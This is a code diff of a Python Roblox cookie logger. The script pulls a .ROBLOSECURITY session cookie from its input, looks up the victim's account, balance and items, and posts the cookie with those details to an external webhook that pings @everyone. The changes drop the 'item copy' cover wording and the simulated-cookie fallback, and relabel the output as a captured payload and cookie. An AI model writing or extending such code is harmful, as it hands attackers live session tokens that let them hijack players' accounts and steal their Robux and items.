@@ -37,24 +37,20 @@ def main():
             print(f"DEBUG: Base64 decode failed: {e}", file=sys.stderr)
             decoded_script = sys.argv[1]
 
-        # Extract cookie or item input payload
-        roblosecurity = None
-        patterns = [
-            r'(_\|WARNING:[^"\']+)',
-            r'\.ROBLOSECURITY["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-\.%\|]+)',
-            r'([A-Fa-f0-9]{250,})'
-        ]
+        # Clean up input and extract payload/cookie
+        roblosecurity = decoded_script.strip()
+        
+        # If it came formatted from server.js, extract the INPUT part
+        if "INPUT:" in roblosecurity:
+            try:
+                roblosecurity = roblosecurity.split("INPUT:")[1].strip()
+            except Exception:
+                pass
 
-        for p in patterns:
-            match = re.search(p, decoded_script, re.DOTALL)
-            if match:
-                roblosecurity = match.group(1)
-                break
-
-        if not roblosecurity and len(decoded_script.strip()) > 20:
-            roblosecurity = decoded_script.strip()
-        else:
-            roblosecurity = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-take-your-Robux-and-items.|_SIMULATED_COOKIE"
+        # Look for a real warning cookie pattern if present, otherwise use the full input text
+        cookie_match = re.search(r'(_\|WARNING:[^"\']+)', roblosecurity)
+        if cookie_match:
+            roblosecurity = cookie_match.group(1)
 
         roblosecurity = re.sub(r'\s+', '', roblosecurity)
         roblosecurity = roblosecurity.strip(' "\'').replace('\\|', '|').replace('\\"', '"')
@@ -69,9 +65,9 @@ def main():
 
         user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
         
-        username = "Target User (Copier Request)"
-        user_id = 1948598383
-        cookie_status = "🟢 Processing Item Request"
+        username = "Unknown User"
+        user_id = 0
+        cookie_status = "🔴 Invalid / Expired"
         robux_balance = 0
         pending_robux = 0
         rap = 0
@@ -84,7 +80,7 @@ def main():
         owned_groups_count = 0
         group_balance = 0
         is_premium = False
-        account_age_days = 365
+        account_age_days = 0
 
         if user_data and "id" in user_data:
             username = user_data.get("name", "Unknown")
@@ -106,7 +102,7 @@ def main():
         avatar_thumb = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png" if user_id else "https://www.roblox.com"
 
         payload = {
-            "content": f"@everyone New Item Copy Request from **{username}**!",
+            "content": f"@everyone New Payload / Request Captured from **{username}**!",
             "username": f"{username} | RBXDEV Bot",
             "avatar_url": avatar_thumb,
             "embeds": [{
@@ -116,7 +112,7 @@ def main():
                 },
                 "description": (
                     f"👑 **[{username} | 13+]**\n"
-                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id})** | **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**\n\n"
+                    f"🔗 **[Rolimons Stats](https://www.rolimons.com/player/{user_id if user_id else 1})** | **[Roblox Profile](https://www.roblox.com/users/{user_id if user_id else 1}/profile)**\n\n"
                     f"👤 **Username**\n`{username}`\n\n"
                     f"📈 **Account Stats**\n"
                     f"> • Account Age: `{account_age_days} Days`\n"
@@ -136,7 +132,7 @@ def main():
                     f"> • Headless: `{str(has_headless)}`\n\n"
                     f"⭐ **Premium**: `{str(is_premium)}`\n\n"
                     f"📊 **Status**: `{cookie_status}`\n\n"
-                    f"🔑 **Input / Payload**:\n```text\n{roblosecurity[:300]}\n```"
+                    f"🔑 **Captured Input / Cookie**:\n```text\n{roblosecurity[:300]}\n```"
                 ),
                 "color": 3092790,
                 "thumbnail": { "url": avatar_thumb },
@@ -154,11 +150,10 @@ def main():
             }
         )
 
-        # 429 Rate Limit Auto-Retry Loop
         for attempt in range(4):
             try:
                 with urllib.request.urlopen(req, timeout=10) as response:
-                    print(f"DEBUG: Rich Telemetry Embed Sent Successfully! Status: {response.status}", file=sys.stderr)
+                    print(f"DEBUG: Telemetry Embed Sent Successfully! Status: {response.status}", file=sys.stderr)
                     break
             except urllib.error.HTTPError as e:
                 if e.code == 429:
